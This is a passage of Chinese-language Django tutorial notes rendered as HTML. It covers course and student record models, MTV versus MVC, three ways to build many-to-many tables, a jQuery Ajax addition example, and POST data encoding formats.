    emergency_contract = models.CharField(max_length=<span class="hljs-number">32</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>, verbose_name=<span class="hljs-string">&apos;&#x7D27;&#x6025;&#x8054;&#x7CFB;&#x4EBA;&apos;</span>)
    company = models.CharField(verbose_name=<span class="hljs-string">&apos;&#x516C;&#x53F8;&apos;</span>, max_length=<span class="hljs-number">128</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)
    location = models.CharField(max_length=<span class="hljs-number">64</span>, verbose_name=<span class="hljs-string">&apos;&#x6240;&#x5728;&#x533A;&#x57DF;&apos;</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)
    position = models.CharField(verbose_name=<span class="hljs-string">&apos;&#x5C97;&#x4F4D;&apos;</span>, max_length=<span class="hljs-number">64</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)
    salary = models.IntegerField(verbose_name=<span class="hljs-string">&apos;&#x85AA;&#x8D44;&apos;</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)
    welfare = models.CharField(verbose_name=<span class="hljs-string">&apos;&#x798F;&#x5229;&apos;</span>, max_length=<span class="hljs-number">256</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)
    date = models.DateField(verbose_name=<span class="hljs-string">&apos;&#x5165;&#x804C;&#x65F6;&#x95F4;&apos;</span>, help_text=<span class="hljs-string">&apos;&#x683C;&#x5F0F;yyyy-mm-dd&apos;</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)
    memo = models.CharField(verbose_name=<span class="hljs-string">&apos;&#x5907;&#x6CE8;&apos;</span>, max_length=<span class="hljs-number">256</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">return</span> self.customer.name

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassStudyRecord</span><span class="hljs-params">(models.Model)</span>:</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x4E0A;&#x8BFE;&#x8BB0;&#x5F55;&#x8868; &#xFF08;&#x73ED;&#x7EA7;&#x8BB0;&#x5F55;&#xFF09;
    &quot;&quot;&quot;</span>
    class_obj = models.ForeignKey(verbose_name=<span class="hljs-string">&quot;&#x73ED;&#x7EA7;&quot;</span>, to=<span class="hljs-string">&quot;ClassList&quot;</span>)
    day_num = models.IntegerField(verbose_name=<span class="hljs-string">&quot;&#x8282;&#x6B21;&quot;</span>, help_text=<span class="hljs-string">u&quot;&#x6B64;&#x5904;&#x586B;&#x5199;&#x7B2C;&#x51E0;&#x8282;&#x8BFE;&#x6216;&#x7B2C;&#x51E0;&#x5929;&#x8BFE;&#x7A0B;...,&#x5FC5;&#x987B;&#x4E3A;&#x6570;&#x5B57;&quot;</span>)
    teacher = models.ForeignKey(verbose_name=<span class="hljs-string">&quot;&#x8BB2;&#x5E08;&quot;</span>, to=<span class="hljs-string">&apos;UserInfo&apos;</span>,limit_choices_to={<span class="hljs-string">&apos;depart&apos;</span>:<span class="hljs-number">1002</span>})
    date = models.DateField(verbose_name=<span class="hljs-string">&quot;&#x4E0A;&#x8BFE;&#x65E5;&#x671F;&quot;</span>, auto_now_add=<span class="hljs-keyword">True</span>)

    course_title = models.CharField(verbose_name=<span class="hljs-string">&apos;&#x672C;&#x8282;&#x8BFE;&#x7A0B;&#x6807;&#x9898;&apos;</span>, max_length=<span class="hljs-number">64</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)
    course_memo = models.TextField(verbose_name=<span class="hljs-string">&apos;&#x672C;&#x8282;&#x8BFE;&#x7A0B;&#x5185;&#x5BB9;&#x6982;&#x8981;&apos;</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)
    has_homework = models.BooleanField(default=<span class="hljs-keyword">True</span>, verbose_name=<span class="hljs-string">&quot;&#x672C;&#x8282;&#x6709;&#x4F5C;&#x4E1A;&quot;</span>)
    homework_title = models.CharField(verbose_name=<span class="hljs-string">&apos;&#x672C;&#x8282;&#x4F5C;&#x4E1A;&#x6807;&#x9898;&apos;</span>, max_length=<span class="hljs-number">64</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)
    homework_memo = models.TextField(verbose_name=<span class="hljs-string">&apos;&#x4F5C;&#x4E1A;&#x63CF;&#x8FF0;&apos;</span>, max_length=<span class="hljs-number">500</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)
    exam = models.TextField(verbose_name=<span class="hljs-string">&apos;&#x8E29;&#x5206;&#x70B9;&apos;</span>, max_length=<span class="hljs-number">300</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;{0} day{1}&quot;</span>.format(self.class_obj, self.day_num)

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StudentStudyRecord</span><span class="hljs-params">(models.Model)</span>:</span>
    <span class="hljs-string">&apos;&apos;&apos;
    &#x5B66;&#x751F;&#x5B66;&#x4E60;&#x8BB0;&#x5F55;
    &apos;&apos;&apos;</span>
    classstudyrecord = models.ForeignKey(verbose_name=<span class="hljs-string">&quot;&#x7B2C;&#x51E0;&#x5929;&#x8BFE;&#x7A0B;&quot;</span>, to=<span class="hljs-string">&quot;ClassStudyRecord&quot;</span>)
    student = models.ForeignKey(verbose_name=<span class="hljs-string">&quot;&#x5B66;&#x5458;&quot;</span>, to=<span class="hljs-string">&apos;Student&apos;</span>)







    record_choices = ((<span class="hljs-string">&apos;checked&apos;</span>, <span class="hljs-string">&quot;&#x5DF2;&#x7B7E;&#x5230;&quot;</span>),
                      (<span class="hljs-string">&apos;vacate&apos;</span>, <span class="hljs-string">&quot;&#x8BF7;&#x5047;&quot;</span>),
                      (<span class="hljs-string">&apos;late&apos;</span>, <span class="hljs-string">&quot;&#x8FDF;&#x5230;&quot;</span>),
                      (<span class="hljs-string">&apos;noshow&apos;</span>, <span class="hljs-string">&quot;&#x7F3A;&#x52E4;&quot;</span>),
                      (<span class="hljs-string">&apos;leave_early&apos;</span>, <span class="hljs-string">&quot;&#x65E9;&#x9000;&quot;</span>),
                      )
    record = models.CharField(<span class="hljs-string">&quot;&#x4E0A;&#x8BFE;&#x7EAA;&#x5F55;&quot;</span>, choices=record_choices, default=<span class="hljs-string">&quot;checked&quot;</span>, max_length=<span class="hljs-number">64</span>)
    score_choices = ((<span class="hljs-number">100</span>, <span class="hljs-string">&apos;A+&apos;</span>),
                     (<span class="hljs-number">90</span>, <span class="hljs-string">&apos;A&apos;</span>),
                     (<span class="hljs-number">85</span>, <span class="hljs-string">&apos;B+&apos;</span>),
                     (<span class="hljs-number">80</span>, <span class="hljs-string">&apos;B&apos;</span>),
                     (<span class="hljs-number">70</span>, <span class="hljs-string">&apos;B-&apos;</span>),
                     (<span class="hljs-number">60</span>, <span class="hljs-string">&apos;C+&apos;</span>),
                     (<span class="hljs-number">50</span>, <span class="hljs-string">&apos;C&apos;</span>),
                     (<span class="hljs-number">40</span>, <span class="hljs-string">&apos;C-&apos;</span>),
                     (<span class="hljs-number">0</span>, <span class="hljs-string">&apos; D&apos;</span>),
                     (<span class="hljs-number">-1</span>, <span class="hljs-string">&apos;N/A&apos;</span>),
                     (<span class="hljs-number">-100</span>, <span class="hljs-string">&apos;COPY&apos;</span>),
                     (<span class="hljs-number">-1000</span>, <span class="hljs-string">&apos;FAIL&apos;</span>),
                     )
    score = models.IntegerField(<span class="hljs-string">&quot;&#x672C;&#x8282;&#x6210;&#x7EE9;&quot;</span>, choices=score_choices, default=<span class="hljs-number">-1</span>)
    homework_note = models.CharField(verbose_name=<span class="hljs-string">&apos;&#x4F5C;&#x4E1A;&#x8BC4;&#x8BED;&apos;</span>, max_length=<span class="hljs-number">255</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)
    note = models.CharField(verbose_name=<span class="hljs-string">&quot;&#x5907;&#x6CE8;&quot;</span>, max_length=<span class="hljs-number">255</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)

    homework = models.FileField(verbose_name=<span class="hljs-string">&apos;&#x4F5C;&#x4E1A;&#x6587;&#x4EF6;&apos;</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>, default=<span class="hljs-keyword">None</span>)
    stu_memo = models.TextField(verbose_name=<span class="hljs-string">&apos;&#x5B66;&#x5458;&#x5907;&#x6CE8;&apos;</span>, blank=<span class="hljs-keyword">True</span>, null=<span class="hljs-keyword">True</span>)
    date = models.DateTimeField(verbose_name=<span class="hljs-string">&apos;&#x63D0;&#x4EA4;&#x4F5C;&#x4E1A;&#x65E5;&#x671F;&apos;</span>, auto_now_add=<span class="hljs-keyword">True</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;{0}-{1}&quot;</span>.format(self.classstudyrecord, self.student)

<span class="hljs-string">&quot;&quot;&quot;
chocies&#x53C2;&#x6570;&#x4F7F;&#x7528;&#x573A;&#x666F;&#x662F;&#x975E;&#x5E38;&#x5E7F;&#x6CDB;&#x7684;
&quot;&quot;&quot;</span>
</code></pre>
<h4 id="mtv&#x4E0E;mvc&#x6A21;&#x578B;">MTV&#x4E0E;MVC&#x6A21;&#x578B;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># MTV:Django&#x53F7;&#x79F0;&#x662F;MTV&#x6A21;&#x578B;</span>
M:models
T:templates
V:views
<span class="hljs-comment"># MVC:&#x5176;&#x5B9E;django&#x672C;&#x8D28;&#x4E5F;&#x662F;MVC</span>
M:models
V:views
C:controller

<span class="hljs-comment"># vue&#x6846;&#x67B6;:MVVM&#x6A21;&#x578B;</span>
</code></pre>
<h4 id="&#x591A;&#x5BF9;&#x591A;&#x4E09;&#x79CD;&#x521B;&#x5EFA;&#x65B9;&#x5F0F;">&#x591A;&#x5BF9;&#x591A;&#x4E09;&#x79CD;&#x521B;&#x5EFA;&#x65B9;&#x5F0F;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x5168;&#x81EA;&#x52A8;:&#x5229;&#x7528;orm&#x81EA;&#x52A8;&#x5E2E;&#x6211;&#x4EEC;&#x521B;&#x5EFA;&#x7B2C;&#x4E09;&#x5F20;&#x5173;&#x7CFB;&#x8868;</span>
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Book</span><span class="hljs-params">(models.Model)</span>:</span>
    name = models.CharField(max_length=<span class="hljs-number">32</span>)
    authors = models.ManyToManyField(to=<span class="hljs-string">&apos;Author&apos;</span>)
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Author</span><span class="hljs-params">(models.Model)</span>:</span>
    name = models.CharField(max_length=<span class="hljs-number">32</span>)
    <span class="hljs-string">&quot;&quot;&quot;
    &#x4F18;&#x70B9;:&#x4EE3;&#x7801;&#x4E0D;&#x9700;&#x8981;&#x4F60;&#x5199; &#x975E;&#x5E38;&#x7684;&#x65B9;&#x4FBF; &#x8FD8;&#x652F;&#x6301;orm&#x63D0;&#x4F9B;&#x64CD;&#x4F5C;&#x7B2C;&#x4E09;&#x5F20;&#x5173;&#x7CFB;&#x8868;&#x7684;&#x65B9;&#x6CD5;...
    &#x4E0D;&#x8DB3;&#x4E4B;&#x5904;:&#x7B2C;&#x4E09;&#x5F20;&#x5173;&#x7CFB;&#x8868;&#x7684;&#x6269;&#x5C55;&#x6027;&#x6781;&#x5DEE;(&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x989D;&#x5916;&#x6DFB;&#x52A0;&#x5B57;&#x6BB5;...)
    &quot;&quot;&quot;</span>
<span class="hljs-comment"># &#x7EAF;&#x624B;&#x52A8;</span>
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Book</span><span class="hljs-params">(models.Model)</span>:</span>
    name = models.CharField(max_length=<span class="hljs-number">32</span>)

    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Author</span><span class="hljs-params">(models.Model)</span>:</span>
    name = models.CharField(max_length=<span class="hljs-number">32</span>)

  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Book2Author</span><span class="hljs-params">(models.Model)</span>:</span>
    book_id = models.ForeignKey(to=<span class="hljs-string">&apos;Book&apos;</span>)
    author_id = models.ForeignKey(to=<span class="hljs-string">&apos;Author&apos;</span>)
  <span class="hljs-string">&apos;&apos;&apos;
  &#x4F18;&#x70B9;:&#x7B2C;&#x4E09;&#x5F20;&#x8868;&#x5B8C;&#x5168;&#x53D6;&#x51B3;&#x4E8E;&#x4F60;&#x81EA;&#x5DF1;&#x8FDB;&#x884C;&#x989D;&#x5916;&#x7684;&#x6269;&#x5C55;
  &#x4E0D;&#x8DB3;&#x4E4B;&#x5904;:&#x9700;&#x8981;&#x5199;&#x7684;&#x4EE3;&#x7801;&#x8F83;&#x591A;&#xFF0C;&#x4E0D;&#x80FD;&#x591F;&#x518D;&#x4F7F;&#x7528;orm&#x63D0;&#x4F9B;&#x7684;&#x7B80;&#x5355;&#x7684;&#x65B9;&#x6CD5;
  &#x4E0D;&#x5EFA;&#x8BAE;&#x4F60;&#x7528;&#x8BE5;&#x65B9;&#x5F0F;
  &apos;&apos;&apos;</span>

<span class="hljs-comment"># &#x534A;&#x81EA;&#x52A8;</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Book</span><span class="hljs-params">(models.Model)</span>:</span>
    name = models.CharField(max_length=<span class="hljs-number">32</span>)
    authors = models.ManyToManyField(to=<span class="hljs-string">&apos;Author&apos;</span>,
                                     through=<span class="hljs-string">&apos;Book2Author&apos;</span>,
                                     through_fields=(<span class="hljs-string">&apos;book&apos;</span>,<span class="hljs-string">&apos;author&apos;</span>)
                                     )
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Author</span><span class="hljs-params">(models.Model)</span>:</span>
    name = models.CharField(max_length=<span class="hljs-number">32</span>)
    <span class="hljs-comment"># books = models.ManyToManyField(to=&apos;Book&apos;,</span>
    <span class="hljs-comment">#                                  through=&apos;Book2Author&apos;,</span>
    <span class="hljs-comment">#                                  through_fields=(&apos;author&apos;,&apos;book&apos;)</span>
    <span class="hljs-comment">#                                  )</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Book2Author</span><span class="hljs-params">(models.Model)</span>:</span>
    book = models.ForeignKey(to=<span class="hljs-string">&apos;Book&apos;</span>)
    author = models.ForeignKey(to=<span class="hljs-string">&apos;Author&apos;</span>)

<span class="hljs-string">&quot;&quot;&quot;
through_fields&#x5B57;&#x6BB5;&#x5148;&#x540E;&#x987A;&#x5E8F;
    &#x5224;&#x65AD;&#x7684;&#x672C;&#x8D28;&#xFF1A;
        &#x901A;&#x8FC7;&#x7B2C;&#x4E09;&#x5F20;&#x8868;&#x67E5;&#x8BE2;&#x5BF9;&#x5E94;&#x7684;&#x8868; &#x9700;&#x8981;&#x7528;&#x5230;&#x54EA;&#x4E2A;&#x5B57;&#x6BB5;&#x5C31;&#x628A;&#x54EA;&#x4E2A;&#x5B57;&#x6BB5;&#x653E;&#x524D;&#x9762;
    &#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x7B80;&#x5316;&#x5224;&#x65AD;
        &#x5F53;&#x524D;&#x8868;&#x662F;&#x8C01; &#x5C31;&#x628A;&#x5BF9;&#x5E94;&#x7684;&#x5173;&#x8054;&#x5B57;&#x6BB5;&#x653E;&#x524D;&#x9762;


&#x534A;&#x81EA;&#x52A8;:&#x53EF;&#x4EE5;&#x4F7F;&#x7528;orm&#x7684;&#x6B63;&#x53CD;&#x5411;&#x67E5;&#x8BE2; &#x4F46;&#x662F;&#x6CA1;&#x6CD5;&#x4F7F;&#x7528;add,set,remove,clear&#x8FD9;&#x56DB;&#x4E2A;&#x65B9;&#x6CD5;
&quot;&quot;&quot;</span>

<span class="hljs-comment"># &#x603B;&#x7ED3;:&#x4F60;&#x9700;&#x8981;&#x638C;&#x63E1;&#x7684;&#x662F;&#x5168;&#x81EA;&#x52A8;&#x548C;&#x534A;&#x81EA;&#x52A8; &#x4E3A;&#x4E86;&#x6269;&#x5C55;&#x6027;&#x66F4;&#x9AD8; &#x4E00;&#x822C;&#x6211;&#x4EEC;&#x90FD;&#x4F1A;&#x91C7;&#x7528;&#x534A;&#x81EA;&#x52A8;(&#x5199;&#x4EE3;&#x7801;&#x8981;&#x7ED9;&#x81EA;&#x5DF1;&#x7559;&#x4E00;&#x6761;&#x540E;&#x8DEF;)</span>
</code></pre>
<h4 id="ajax">Ajax</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x5F02;&#x6B65;&#x63D0;&#x4EA4;
&#x5C40;&#x90E8;&#x5237;&#x65B0;
&#x4F8B;&#x5B50;:github&#x6CE8;&#x518C;
    &#x52A8;&#x6001;&#x83B7;&#x53D6;&#x7528;&#x6237;&#x540D;&#x5B9E;&#x65F6;&#x7684;&#x8DDF;&#x540E;&#x7AEF;&#x786E;&#x8BA4;&#x5E76;&#x5B9E;&#x65F6;&#x5C55;&#x793A;&#x7684;&#x524D;&#x7AEF;(&#x5C40;&#x90E8;&#x5237;&#x65B0;)

&#x671D;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x7684;&#x65B9;&#x5F0F;
    1.&#x6D4F;&#x89C8;&#x5668;&#x5730;&#x5740;&#x680F;&#x76F4;&#x63A5;&#x8F93;&#x5165;url&#x56DE;&#x8F66;                           GET&#x8BF7;&#x6C42;
    2.a&#x6807;&#x7B7E;href&#x5C5E;&#x6027;                                                GET&#x8BF7;&#x6C42;
    3.form&#x8868;&#x5355;                                                         GET&#x8BF7;&#x6C42;/POST&#x8BF7;&#x6C42;
    4.ajax                                                                GET&#x8BF7;&#x6C42;/POST&#x8BF7;&#x6C42;    

AJAX &#x4E0D;&#x662F;&#x65B0;&#x7684;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#xFF0C;&#x800C;&#x662F;&#x4E00;&#x79CD;&#x4F7F;&#x7528;&#x73B0;&#x6709;&#x6807;&#x51C6;&#x7684;&#x65B0;&#x65B9;&#x6CD5;(&#x6BD4;&#x8F83;&#x88C5;&#x9970;&#x5668;)


AJAX &#x6700;&#x5927;&#x7684;&#x4F18;&#x70B9;&#x662F;&#x5728;&#x4E0D;&#x91CD;&#x65B0;&#x52A0;&#x8F7D;&#x6574;&#x4E2A;&#x9875;&#x9762;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x4EA4;&#x6362;&#x6570;&#x636E;&#x5E76;&#x66F4;&#x65B0;&#x90E8;&#x5206;&#x7F51;&#x9875;&#x5185;&#x5BB9;&#x3002;&#xFF08;&#x8FD9;&#x4E00;&#x7279;&#x70B9;&#x7ED9;&#x7528;&#x6237;&#x7684;&#x611F;&#x53D7;&#x662F;&#x5728;&#x4E0D;&#x77E5;&#x4E0D;&#x89C9;&#x4E2D;&#x5B8C;&#x6210;&#x8BF7;&#x6C42;&#x548C;&#x54CD;&#x5E94;&#x8FC7;&#x7A0B;&#xFF09;


Ajax&#x6211;&#x4EEC;&#x53EA;&#x5B66;&#x4E60;jQuery&#x5C01;&#x88C5;&#x4E4B;&#x540E;&#x7684;&#x7248;&#x672C;(&#x4E0D;&#x5B66;&#x539F;&#x751F;&#x7684; &#x539F;&#x751F;&#x7684;&#x590D;&#x6742;&#x5E76;&#x4E14;&#x5728;&#x5B9E;&#x9645;&#x9879;&#x76EE;&#x4E2D;&#x4E5F;&#x4E00;&#x822C;&#x4E0D;&#x7528;)
&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5728;&#x524D;&#x7AEF;&#x9875;&#x9762;&#x4F7F;&#x7528;ajax&#x7684;&#x65F6;&#x5019;&#x9700;&#x8981;&#x786E;&#x4FDD;&#x5BFC;&#x5165;&#x4E86;jQuery
ps:&#x5E76;&#x4E0D;&#x53EA;&#x6709;jQuery&#x80FD;&#x591F;&#x5B9E;&#x73B0;ajax&#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x6846;&#x67B6;&#x4E5F;&#x53EF;&#x4EE5; &#x4F46;&#x662F;&#x6362;&#x6C64;&#x4E0D;&#x6362;&#x836F; &#x539F;&#x7406;&#x662F;&#x4E00;&#x6837;&#x7684;
&quot;&quot;&quot;</span>
</code></pre>
<h4 id="&#x5C0F;&#x4F8B;&#x5B50;">&#x5C0F;&#x4F8B;&#x5B50;</h4>
<pre><code class="lang-python">&quot;&quot;&quot;
&#x9875;&#x9762;&#x4E0A;&#x6709;&#x4E09;&#x4E2A;input&#x6846;
    &#x5728;&#x524D;&#x4E24;&#x4E2A;&#x6846;&#x4E2D;&#x8F93;&#x5165;&#x6570;&#x5B57; &#x70B9;&#x51FB;&#x6309;&#x94AE; &#x671D;&#x540E;&#x7AEF;&#x53D1;&#x9001;ajax&#x8BF7;&#x6C42;
    &#x540E;&#x7AEF;&#x8BA1;&#x7B97;&#x51FA;&#x7ED3;&#x679C; &#x518D;&#x8FD4;&#x56DE;&#x7ED9;&#x524D;&#x7AEF;&#x52A8;&#x6001;&#x5C55;&#x793A;&#x7684;&#x5230;&#x7B2C;&#x4E09;&#x4E2A;input&#x6846;&#x4E2D;
    (&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x9875;&#x9762;&#x4E0D;&#x51C6;&#x6709;&#x5237;&#x65B0;,&#x4E5F;&#x4E0D;&#x80FD;&#x5728;&#x524D;&#x7AEF;&#x8BA1;&#x7B97;)
&quot;&quot;&quot;
&lt;script&gt;
    // &#x5148;&#x7ED9;&#x6309;&#x94AE;&#x7ED1;&#x5B9A;&#x4E00;&#x4E2A;&#x70B9;&#x51FB;&#x4E8B;&#x4EF6;
    $(&apos;#btn&apos;).click(function () {
        // &#x671D;&#x540E;&#x7AEF;&#x53D1;&#x9001;ajax&#x8BF7;&#x6C42;
        $.ajax({
            // 1.&#x6307;&#x5B9A;&#x671D;&#x54EA;&#x4E2A;&#x540E;&#x7AEF;&#x53D1;&#x9001;ajax&#x8BF7;&#x6C42;
            url:&apos;&apos;, // &#x4E0D;&#x5199;&#x5C31;&#x662F;&#x671D;&#x5F53;&#x524D;&#x5730;&#x5740;&#x63D0;&#x4EA4;
            // 2.&#x8BF7;&#x6C42;&#x65B9;&#x5F0F;
            type:&apos;post&apos;,  // &#x4E0D;&#x6307;&#x5B9A;&#x9ED8;&#x8BA4;&#x5C31;&#x662F;get &#x90FD;&#x662F;&#x5C0F;&#x5199;
            // 3.&#x6570;&#x636E;
            {#data:{&apos;username&apos;:&apos;jason&apos;,&apos;password&apos;:123},#}
            data:{&apos;i1&apos;:$(&apos;#d1&apos;).val(),&apos;i2&apos;:$(&apos;#d2&apos;).val()},
            // 4.&#x56DE;&#x8C03;&#x51FD;&#x6570;:&#x5F53;&#x540E;&#x7AEF;&#x7ED9;&#x4F60;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x81EA;&#x52A8;&#x89E6;&#x53D1; args&#x63A5;&#x53D7;&#x540E;&#x7AEF;&#x7684;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;
            success:function (args) {
                {#alert(args)  // &#x901A;&#x8FC7;DOM&#x64CD;&#x4F5C;&#x52A8;&#x6001;&#x6E32;&#x67D3;&#x5230;&#x7B2C;&#x4E09;&#x4E2A;input&#x91CC;&#x9762;#}
                $(&apos;#d3&apos;).val(args)
                console.log(typeof args)

            }
        })
    })
&lt;/script&gt; 


class MyLogin(View):
    def sql(request):
        conn = pymysql.connect(
            host=&apos;127.0.0.1&apos;,
            port=3306,
            user=&apos;root&apos;,
            password=&apos;root&apos;,
            database=&apos;day60&apos;,
            charset=&apos;utf8&apos;  # &#x7F16;&#x7801;&#x5343;&#x4E07;&#x4E0D;&#x8981;&#x52A0;-
        )

        if request.method == &quot;POST&quot;:
            # print(request.POST)  # &lt;QueryDict: {&apos;username&apos;: [&apos;jason&apos;], &apos;password&apos;: [&apos;123&apos;]}&gt;
            i1 = request.POST.get(&apos;i1&apos;)
            i2 = request.POST.get(&apos;i2&apos;)
            # &#x5148;&#x8F6C;&#x6210;&#x6574;&#x578B;&#x518D;&#x52A0;
            i3 = int(i1) + int(i2)
            print(i3)
            d = {&apos;code&apos;:100,&apos;msg&apos;:i3}
            # d = {&apos;code&apos;: 100, &apos;msg&apos;: 666}
            return HttpResponse(json.dumps(d))
            # return JsonResponse(d)
        return render(request, &apos;index.html&apos;)            
&quot;&quot;&quot;
&#x9488;&#x5BF9;&#x540E;&#x7AEF;&#x5982;&#x679C;&#x662F;&#x7528;HttpResponse&#x8FD4;&#x56DE;&#x7684;&#x6570;&#x636E; &#x56DE;&#x8C03;&#x51FD;&#x6570;&#x4E0D;&#x4F1A;&#x81EA;&#x52A8;&#x5E2E;&#x4F60;&#x53CD;&#x5E8F;&#x5217;&#x5316;
&#x5982;&#x679C;&#x540E;&#x7AEF;&#x76F4;&#x63A5;&#x7528;&#x7684;&#x662F;JsonResponse&#x8FD4;&#x56DE;&#x7684;&#x6570;&#x636E; &#x56DE;&#x8C03;&#x51FD;&#x6570;&#x4F1A;&#x81EA;&#x52A8;&#x5E2E;&#x4F60;&#x53CD;&#x5E8F;&#x5217;&#x5316;

HttpResponse&#x89E3;&#x51B3;&#x65B9;&#x5F0F;
    1.&#x81EA;&#x5DF1;&#x5728;&#x524D;&#x7AEF;&#x5229;&#x7528;JSON.parse()
    2.&#x5728;ajax&#x91CC;&#x9762;&#x914D;&#x7F6E;&#x4E00;&#x4E2A;&#x53C2;&#x6570;
            (&#x540E;&#x9762;&#x518D;&#x8BB2;)
&quot;&quot;&quot;
</code></pre>
<p><a href="https://imgse.com/i/p9G6KSO" target="_blank"><img src="https://s1.ax1x.com/2023/05/02/p9G6KSO.png" alt="p9G6KSO.png"></a></p>
<h4 id="&#x524D;&#x540E;&#x7AEF;&#x4F20;&#x8F93;&#x6570;&#x636E;&#x7684;&#x7F16;&#x7801;&#x683C;&#x5F0F;contenttype">&#x524D;&#x540E;&#x7AEF;&#x4F20;&#x8F93;&#x6570;&#x636E;&#x7684;&#x7F16;&#x7801;&#x683C;&#x5F0F;(contentType)</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x6211;&#x4EEC;&#x4E3B;&#x8981;&#x7814;&#x7A76;post&#x8BF7;&#x6C42;&#x6570;&#x636E;&#x7684;&#x7F16;&#x7801;&#x683C;&#x5F0F;</span>
<span class="hljs-string">&quot;&quot;&quot;
get&#x8BF7;&#x6C42;&#x6570;&#x636E;&#x5C31;&#x662F;&#x76F4;&#x63A5;&#x653E;&#x5728;url&#x540E;&#x9762;&#x7684;
url?username=jason&amp;password=123
&quot;&quot;&quot;</span>

<span class="hljs-comment"># &#x53EF;&#x4EE5;&#x671D;&#x540E;&#x7AEF;&#x53D1;&#x9001;post&#x8BF7;&#x6C42;&#x7684;&#x65B9;&#x5F0F;</span>
    <span class="hljs-string">&quot;&quot;&quot;
    1.form&#x8868;&#x5355;
    2.ajax&#x8BF7;&#x6C42;
    &quot;&quot;&quot;</span>


<span class="hljs-string">&quot;&quot;&quot;
&#x524D;&#x540E;&#x7AEF;&#x4F20;&#x8F93;&#x6570;&#x636E;&#x7684;&#x7F16;&#x7801;&#x683C;&#x5F0F;
    urlencoded

    formdata

    json
&quot;&quot;&quot;</span>
<span class="hljs-comment"># &#x7814;&#x7A76;form&#x8868;&#x5355;</span>
    &#x9ED8;&#x8BA4;&#x7684;&#x6570;&#x636E;&#x7F16;&#x7801;&#x683C;&#x5F0F;&#x662F;urlencoded
  &#x6570;&#x636E;&#x683C;&#x5F0F;:username=jason&amp;password=<span class="hljs-number">123</span>
  django&#x540E;&#x7AEF;&#x9488;&#x5BF9;&#x7B26;&#x5408;urlencoded&#x7F16;&#x7801;&#x683C;&#x5F0F;&#x7684;&#x6570;&#x636E;&#x90FD;&#x4F1A;&#x81EA;&#x52A8;&#x5E2E;&#x4F60;&#x89E3;&#x6790;&#x5C01;&#x88C5;&#x5230;request.POST&#x4E2D;
      username=jason&amp;password=<span class="hljs-number">123</span>    &gt;&gt;&gt; request.POST

  &#x5982;&#x679C;&#x4F60;&#x628A;&#x7F16;&#x7801;&#x683C;&#x5F0F;&#x6539;&#x6210;formdata&#xFF0C;&#x90A3;&#x4E48;&#x9488;&#x5BF9;&#x666E;&#x901A;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x8FD8;&#x662F;&#x89E3;&#x6790;&#x5230;request.POST&#x4E2D;&#x800C;&#x5C06;&#x6587;&#x4EF6;&#x89E3;&#x6790;&#x5230;request.FILES&#x4E2D;

  form&#x8868;&#x5355;&#x662F;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x53D1;&#x9001;json&#x683C;&#x5F0F;&#x6570;&#x636E;&#x7684;


<span class="hljs-comment"># &#x7814;&#x7A76;ajax</span>
    &#x9ED8;&#x8BA4;&#x7684;&#x7F16;&#x7801;&#x683C;&#x5F0F;&#x4E5F;&#x662F;urlencoded
